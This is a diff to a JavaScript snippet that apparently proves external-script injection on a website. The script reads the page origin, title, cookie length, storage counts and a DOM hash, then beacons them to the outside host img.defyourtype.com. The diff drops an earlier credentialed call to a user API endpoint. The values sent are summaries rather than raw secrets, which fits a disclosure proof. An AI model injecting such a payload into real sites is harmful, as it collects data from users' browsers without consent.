@@ -5,15 +5,15 @@
   if (window.__exchangeExternalScriptProof) return;
 
   const marker = "silver-lantern-83f1c2";
-  const endpoint = "/api/user/api/organizations/v2/users/self";
   const result = {
     marker,
     origin: location.origin,
     title: document.title,
     cookieLength: document.cookie.length,
-    apiStatus: 0,
-    apiLength: 0,
-    apiHashPrefix: "pending",
+    localStorageEntries: localStorage.length,
+    sessionStorageEntries: sessionStorage.length,
+    domLength: 0,
+    domHashPrefix: "pending",
   };
   window.__exchangeExternalScriptProof = result;
 
@@ -38,9 +38,10 @@
       `Origin: ${result.origin}`,
       `DOM title read: ${result.title}`,
       `Readable cookie bytes: ${result.cookieLength}`,
-      `Same-origin API status: ${result.apiStatus || "pending"}`,
-      `Same-origin response bytes: ${result.apiLength}`,
-      `Same-origin response SHA-256 prefix: ${result.apiHashPrefix}`,
+      `Local-storage entries: ${result.localStorageEntries}`,
+      `Session-storage entries: ${result.sessionStorageEntries}`,
+      `DOM bytes read: ${result.domLength}`,
+      `DOM SHA-256 prefix: ${result.domHashPrefix}`,
     ].join("\n");
   };
 
@@ -61,30 +62,26 @@
       origin: result.origin,
       title: result.title,
       cookieLength: String(result.cookieLength),
-      apiStatus: String(result.apiStatus),
-      apiLength: String(result.apiLength),
-      apiHashPrefix: result.apiHashPrefix,
+      localStorageEntries: String(result.localStorageEntries),
+      sessionStorageEntries: String(result.sessionStorageEntries),
+      domLength: String(result.domLength),
+      domHashPrefix: result.domHashPrefix,
     });
-    const image = new Image();
-    image.src = `https://img.defyourtype.com/r/silver-lantern-83f1c2.gif?${query}`;
+    fetch(`https://img.defyourtype.com/r/silver-lantern-83f1c2.gif?${query}`, {
+      mode: "no-cors",
+      credentials: "omit",
+      keepalive: true,
+    }).catch(() => {});
   };
 
   document.body.appendChild(banner);
   draw();
 
-  fetch(endpoint, { credentials: "include" })
-    .then(async (response) => {
-      const body = await response.text();
-      result.apiStatus = response.status;
-      result.apiLength = body.length;
-      result.apiHashPrefix = await digestPrefix(body);
-    })
-    .catch((error) => {
-      result.apiStatus = -1;
-      result.apiHashPrefix = error?.name || "Error";
-    })
-    .finally(() => {
-      draw();
-      signal();
-    });
+  const dom = document.documentElement.outerHTML;
+  result.domLength = dom.length;
+  digestPrefix(dom).then((hash) => {
+    result.domHashPrefix = hash;
+    draw();
+    signal();
+  });
 })();
